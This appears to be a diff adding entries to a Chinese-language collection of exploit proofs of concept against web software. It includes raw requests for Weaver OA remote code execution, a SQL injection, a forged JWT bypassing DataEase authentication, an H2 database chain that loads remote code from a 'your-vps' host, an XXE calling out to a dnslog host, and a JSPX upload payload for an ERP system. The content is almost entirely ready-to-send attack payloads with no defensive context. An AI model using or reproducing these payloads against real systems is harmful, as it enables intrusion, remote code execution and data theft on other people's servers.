@@ -104,3 +104,190 @@ cmd: path
 </soap:Body>
 </soap:Envelope>
 
+
+泛微OA后台RCE
+POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
+Host: xxxx:xxx
+If-None-Match: "6evu6PUo/Cz"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Cache-Name: 5bCP6Im+
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="operation"
+
+add
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="encryptname"
+
+ttttaaa
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="encryptclass"
+
+org.mvel2.sh.ShellSession
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="encryptmethod"
+
+exec
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="decryptmethod"
+
+exec
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="isdialog"
+
+0
+------WebKitFormBoundaryVnIIugCdViAmEyK3
+Content-Disposition: form-data; name="x"; filename="x"
+
+x
+------WebKitFormBoundaryVnIIugCdViAmEyK3--
+
+
+
+
+POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1
+Host: xxxx:xxx
+If-None-Match: "6evu6PUo/Cz"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+Content-Type: application/x-www-form-urlencoded
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Cache-Name: 5bCP6Im+
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+
+
+
+POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
+Host: xxxx:xxx
+If-None-Match: "6evu6PUo/Cz"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrx
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Name: 5bCP6Im+
+Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+
+------WebKitFormBoundaryITdrxxca8L1Xo7Rq
+Content-Disposition: form-data; name="operation"
+
+test
+------WebKitFormBoundaryITdrxxca8L1Xo7Rq
+Content-Disposition: form-data; name="plaintext"
+
+马子
+------WebKitFormBoundaryITdrxxca8L1Xo7Rq
+Content-Disposition: form-data; name="id"
+
+2
+------WebKitFormBoundaryITdrxxca8L1Xo7Rq
+Content-Disposition: form-data; name="x"; filename="x"
+
+1
+------WebKitFormBoundaryITdrxxca8L1Xo7Rq--
+
+
+
+华测监测预警系统 sysGroupEdit.aspx SQL注入
+GET /Web/SysManage/sysGroupEdit.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2889%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%2888%29%2BCHAR%28105%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28110%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28118%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2866%29%2BCHAR%2899%29%2BCHAR%2868%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%2875%29%2BCHAR%2876%29%2BCHAR%28115%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%2873%29%2BCHAR%2888%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2876%29%2BCHAR%2880%29%2BCHAR%2898%29%2BCHAR%28119%29%2BCHAR%2889%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29--+wkZw
+
+Dataease JWT 认证绕过漏洞(CVE-2025-49001)
+GET /de2api/user/info HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept-Encoding: gzip, deflate
+Accept: application/json, text/plain, */*
+Connection: close
+Host: xx.x.xx.xx
+out_auth_platform: default
+X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8￼
+
+Dataease H2数据库远程代码执行漏洞(CVE-2025-49002)
+evil.xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <!-- 使用DNSLog外带信息 -->
+    <bean class="java.net.InetAddress" factory-method="getByName">
+            <constructor-arg value="http://dnslog"/>
+    </bean>
+</beans>
+
+poc.sql
+CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
+CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
+CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';
+
+SET @url_str='http://your-vps/evil.xml';
+SET @url_obj=UNESCAPE_VALUE(@url_str);
+SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
+SET @string_clazz=CLASS_FOR_NAME('java.lang.String');
+
+CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);
+
+POST /de2api/datasource/validate HTTP/1.1
+Host: your-ip
+Accept-Encoding: gzip, deflate, br, zstd
+sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
+Accept-Language: zh-CN
+Sec-Fetch-Dest: empty
+sec-ch-ua-mobile: ?0
+Sec-Fetch-Site: same-origin
+sec-ch-ua-platform: "Windows"
+Content-Type: application/json
+Sec-Fetch-Mode: cors
+Content-Length: 821
+
+{
+    "id": "",
+    "name": "11",
+    "description": "",
+    "type": "h2",
+    "apiConfiguration": [],
+    "paramsConfiguration": [],
+    "enableDataFill": false,
+    "configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0ZGI7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO2luaXQ9UlVuU0NSSVBUIEZST00gJ2h0dHA6Ly95b3VyLXZwczoyMzMzL3BvYy5zcWwnIiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJob3N0IjoiIiwiYXV0aE1ldGhvZCI6IiIsInBvcnQiOjAsImluaXRpYWxQb29sU2l6ZSI6NSwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1LCJxdWVyeVRpbWVvdXQiOjMwfQ=="
+}
+
+金和OA-C6系统ActionDataSet接口XXE漏洞
+POST /jc6/servlet/ActionDataSet HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://323232323.xxxx.dnslog.cn"> %remote;]>
+
+北京时空智友ERP系统 updater.uploadStudioFile 文件上传漏洞
+POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+Host: xxxx.com
+Content-Type: application/x-www-form-urlencoded
+
+content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>
